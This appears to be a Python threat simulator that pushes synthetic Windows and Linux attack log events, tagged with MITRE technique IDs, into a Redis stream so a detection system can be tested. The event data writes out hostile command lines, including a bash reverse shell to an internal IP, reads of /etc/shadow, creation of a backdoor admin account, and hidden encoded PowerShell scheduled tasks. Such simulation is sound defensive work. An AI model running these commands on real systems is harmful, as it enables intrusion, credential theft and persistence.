from __future__ import annotations
import argparse, json, time, uuid

try:
    import redis
except ImportError:
    print("pip install redis"); raise

REDIS_HOST = "localhost"
REDIS_PORT = 6379
STREAM     = "threatos:events:normalized"

def push(r, event):
    return r.xadd(STREAM, {
        "event_id":    event.get("event_id", str(uuid.uuid4())),
        "log_source":  event.get("log_source", "winlog"),
        "host":        event.get("host", "UNKNOWN"),
        "user":        event.get("user", ""),
        "process":     event.get("process", ""),
        "command_line":event.get("command_line", ""),
        "src_ip":      event.get("src_ip", ""),
        "dst_ip":      event.get("dst_ip", ""),
        "dst_port":    str(event.get("dst_port", "")),
        "file_path":   event.get("file_path", ""),
        "raw_fields":  json.dumps(event),
    })

SCENARIOS = {
    "rdp_brute_force": {
        "name": "RDP Brute Force (T1110.003)",
        "technique_id": "T1110.003",
        "description": "Attacker password spraying via RDP",
        "events": [
            {"log_source":"winlog","host":"WIN-DC01","user":"Administrator",
             "src_ip":"192.168.1.50","dst_ip":"10.10.10.5","dst_port":3389,
             "process":"svchost.exe","command_line":"svchost.exe -k termsvcs",
             "event_id":"4625","logon_type":"10","auth_result":"failure",
             "description":"Failed RDP logon attempt 1"},
            {"log_source":"winlog","host":"WIN-DC01","user":"Administrator",
             "src_ip":"192.168.1.50","dst_ip":"10.10.10.5","dst_port":3389,
             "process":"svchost.exe","command_line":"svchost.exe -k termsvcs",
             "event_id":"4625","logon_type":"10","auth_result":"failure",
             "description":"Failed RDP logon attempt 2"},
            {"log_source":"winlog","host":"WIN-DC01","user":"Administrator",
             "src_ip":"192.168.1.50","dst_ip":"10.10.10.5","dst_port":3389,
             "process":"svchost.exe","command_line":"svchost.exe -k termsvcs",
             "event_id":"4624","logon_type":"10","auth_result":"success",
             "description":"Successful RDP logon after brute force"},
        ],
    },
    "rdp_lateral_movement": {
        "name": "RDP Lateral Movement (T1021.001)",
        "technique_id": "T1021.001",
        "description": "Attacker using RDP to move laterally",
        "events": [
            {"log_source":"winlog","host":"WIN-WORKSTATION01","user":"jsmith",
             "src_ip":"10.10.10.20","dst_ip":"10.10.10.5","dst_port":3389,
             "process":"mstsc.exe","command_line":"mstsc.exe /v:10.10.10.5 /f",
             "event_id":"4648","description":"RDP connection to server"},
            {"log_source":"winlog","host":"WIN-DC01","user":"jsmith",
             "src_ip":"10.10.10.20","event_id":"4624","logon_type":"10",
             "process":"winlogon.exe","command_line":"winlogon.exe",
             "auth_result":"success","description":"RDP session opened on DC"},
            {"log_source":"winlog","host":"WIN-DC01","user":"jsmith",
             "process":"cmd.exe","command_line":"cmd.exe /c net user /domain",
             "description":"Domain recon after RDP login"},
        ],
    },
    "psexec_lateral": {
        "name": "PSExec Lateral Movement (T1569.002)",
        "technique_id": "T1569.002",
        "description": "Attacker using PSExec to execute commands on remote host",
        "events": [
            {"log_source":"winlog","host":"WIN-WORKSTATION01","user":"jsmith",
             "process":"psexec.exe",
             "command_line":"psexec.exe \\\\10.10.10.10 -u Administrator -p P@ss cmd.exe",
             "description":"PSExec launched from workstation"},
            {"log_source":"winlog","host":"WIN-SERVER01","user":"Administrator",
             "process":"PSEXESVC.exe","command_line":"C:\\Windows\\PSEXESVC.exe",
             "file_path":"C:\\Windows\\PSEXESVC.exe","event_id":"7045",
             "description":"PSExec service installed on target"},
            {"log_source":"winlog","host":"WIN-SERVER01","user":"Administrator",
             "process":"cmd.exe","parent_process":"PSEXESVC.exe",
             "command_line":"cmd.exe /c whoami && net localgroup administrators",
             "description":"Commands executed via PSExec"},
            {"log_source":"winlog","host":"WIN-SERVER01","user":"Administrator",
             "process":"cmd.exe","parent_process":"PSEXESVC.exe",
             "command_line":"cmd.exe /c net user hacker P@ss /add && net localgroup administrators hacker /add",
             "description":"Backdoor admin account added via PSExec"},
        ],
    },
    "scheduled_task_persist": {
        "name": "Scheduled Task Persistence (T1053.005)",
        "technique_id": "T1053.005",
        "description": "Attacker creating scheduled task for persistence",
        "events": [
            {"log_source":"winlog","host":"WIN-SERVER01","user":"Administrator",
             "process":"schtasks.exe",
             "command_line":"schtasks /create /tn \"Windows Update Helper\" /tr \"C:\\Users\\Public\\update.exe\" /sc onlogon /ru SYSTEM",
             "event_id":"4698","description":"Scheduled task created for persistence"},
            {"log_source":"winlog","host":"WIN-SERVER01","user":"SYSTEM",
             "process":"update.exe","parent_process":"svchost.exe",
             "command_line":"C:\\Users\\Public\\update.exe -beacon 192.168.1.100",
             "file_path":"C:\\Users\\Public\\update.exe",
             "description":"Malicious binary executed by scheduled task"},
        ],
    },
    "scheduled_task_powershell": {
        "name": "Scheduled Task with PowerShell Payload (T1053.005)",
        "technique_id": "T1053.005",
        "description": "Scheduled task running hidden encoded PowerShell",
        "events": [
            {"log_source":"winlog","host":"WIN-DC01","user":"Administrator",
             "process":"schtasks.exe",
             "command_line":"schtasks /create /tn \"Updater\" /tr \"powershell.exe -WindowStyle Hidden -EncodedCommand JABjAD0A\" /sc daily /st 03:00",
             "description":"Scheduled task with hidden PowerShell payload"},
            {"log_source":"winlog","host":"WIN-DC01","user":"SYSTEM",
             "process":"powershell.exe","parent_process":"svchost.exe",
             "command_line":"powershell.exe -WindowStyle Hidden -EncodedCommand JABjAD0A",
             "description":"Hidden PowerShell runs from scheduled task"},
        ],
    },
    "malicious_service": {
        "name": "Malicious Service Installation (T1543.003)",
        "technique_id": "T1543.003",
        "description": "Attacker installs Windows service for persistence",
        "events": [
            {"log_source":"winlog","host":"WIN-SERVER01","user":"Administrator",
             "process":"sc.exe",
             "command_line":"sc create \"WindowsDefenderUpdate\" binpath= \"C:\\Windows\\Temp\\svc.exe\" start= auto",
             "event_id":"7045","description":"Malicious service created"},
            {"log_source":"winlog","host":"WIN-SERVER01","user":"SYSTEM",
             "process":"svc.exe","parent_process":"services.exe",
             "command_line":"C:\\Windows\\Temp\\svc.exe",
             "file_path":"C:\\Windows\\Temp\\svc.exe",
             "description":"Malicious service binary running from Temp"},
        ],
    },
    "linux_cron_persist": {
        "name": "Linux Cron Persistence (T1053.003)",
        "technique_id": "T1053.003",
        "description": "Attacker adds crontab for persistence on Linux",
        "events": [
            {"log_source":"syslog","host":"linux-server01","user":"www-data",
             "process":"crontab","command_line":"crontab -e",
             "description":"Crontab modified by web app user"},
            {"log_source":"syslog","host":"linux-server01","user":"www-data",
             "process":"bash",
             "command_line":"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
             "src_ip":"192.168.1.100","dst_port":4444,
             "description":"Reverse shell spawned from cron"},
        ],
    },
    "linux_ssh_lateral": {
        "name": "Linux SSH Lateral Movement (T1021.004)",
        "technique_id": "T1021.004",
        "description": "Attacker hopping between Linux hosts via SSH",
        "events": [
            {"log_source":"syslog","host":"linux-server01","user":"deploy",
             "process":"ssh","command_line":"ssh -i /tmp/.key deploy@10.10.10.30",
             "dst_ip":"10.10.10.30","dst_port":22,
             "description":"SSH lateral movement using key from /tmp"},
            {"log_source":"syslog","host":"linux-server02","user":"deploy",
             "process":"sshd","command_line":"sshd: deploy@pts/1",
             "src_ip":"10.10.10.20","description":"SSH login on target host"},
            {"log_source":"syslog","host":"linux-server02","user":"deploy",
             "process":"bash",
             "command_line":"cat /etc/passwd && cat /etc/shadow && id && uname -a",
             "description":"Post-SSH recon commands"},
        ],
    },
}

def main():
    parser = argparse.ArgumentParser(description="ThreatOS threat simulator")
    parser.add_argument("--scenario", help="Run single scenario by key")
    parser.add_argument("--list",     action="store_true")
    parser.add_argument("--host",     help="Override host for all events")
    parser.add_argument("--delay",    type=float, default=0.2)
    args = parser.parse_args()

    if args.list:
        print("\nAvailable scenarios:\n")
        for key, s in SCENARIOS.items():
            print(f"  {key:<40} {s['name']}")
        print()
        return

    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, decode_responses=True)
    r.ping()
    print(f"Connected to Redis. Stream: {STREAM}\n")

    to_run = {args.scenario: SCENARIOS[args.scenario]} \
             if args.scenario and args.scenario in SCENARIOS \
             else SCENARIOS

    total = 0
    for key, scenario in to_run.items():
        print(f"► {scenario['name']}")
        print(f"  {scenario['description']}")
        for i, event in enumerate(scenario["events"]):
            if args.host:
                event = {**event, "host": args.host}
            event["event_id"] = str(uuid.uuid4())
            push(r, event)
            print(f"    [{i+1}] {event.get('description','')}")
            total += 1
            time.sleep(args.delay)
        print()

    print(f"Done. Pushed {total} events.")
    print("Wait 3 seconds then check alerts:")
    print("  curl -s http://localhost:8001/api/alerts")

if __name__ == "__main__":
    main()
